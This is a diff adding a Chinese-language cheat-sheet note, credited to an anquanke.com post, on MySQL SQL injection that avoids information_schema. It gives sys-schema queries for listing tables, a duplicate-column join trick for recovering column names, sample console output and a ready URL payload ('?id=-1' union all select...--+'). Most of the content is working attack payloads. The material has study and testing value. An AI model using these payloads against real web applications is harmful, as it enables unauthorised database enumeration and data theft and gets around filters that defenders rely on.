@@ -1,0 +1,82 @@
+原文链接：https://www.anquanke.com/post/id/193512
+
+查询表：
+要求：
+1.大于mysql 5.6
+2.数据库里面的表是自增ID，否则查询出来的表是NULL
+
+几个查询语句：(不使用information_schema查询表)
+select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database();
+select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database();
+select group_concat(table_name) from sys.x$ps_schema_table_statistics_io where table_schema=database();
+
+查询字段名：
+要求：无
+
+查询语句：
+select * from (select * from <表名> as a join <表名> b)c #查询第一个字段名
+select * from (select * from <表名> as a join <表名> b using(<第一个字段名>)) #查询第二个字段名
+select * from (select * from <表名> as a join <表名> b using(<第一个字段名>,<第二个字段名>)) #查询第三个字段名。。以此类推
+
+示例：
+mysql> select * from (select * from users as a join users b)c;
+ERROR 1060 (42S21): Duplicate column name 'ID'
+mysql> select * from (select * from users as a join users b using(id))c;
+ERROR 1060 (42S21): Duplicate column name 'USERNAME'
+
+?id=-1' union all select*from (select * from users as a join users b)c--+
+
+示例：
+mysql> select group_concat(table_name) from sys.schema_table_statistics_with_buf
+fer where table_schema=database();
++-------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+-+
+| group_concat(table_name)
+
+
+
+
+
+
+
+
+ |
++-------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+-+
+| columns,tables,index_column_usage,routines,table_partitions,indexes,triggers,c
+ollations,events,column_type_elements,foreign_keys,character_sets,column_statist
+ics,foreign_key_column_usage,index_partitions,parameters,schemata,catalogs,db,pr
+ocs_priv,proxies_priv,resource_groups,tablespaces,tablespace_files,tables_priv,v
+iew_routine_usage,view_table_usage,columns_priv,component,dd_properties,default_
+roles,engine_cost,func,global_grants,gtid_executed,parameter_type_elements,passw
+ord_history,plugin,role_edges,servers,server_cost,slave_master_info,slave_relay_
+log_info,slave_worker_info,table_partition_values,table_stats,time_zone,time_zon
+e_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user
+ |
++-------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+-+
+1 row in set (0.10 sec)
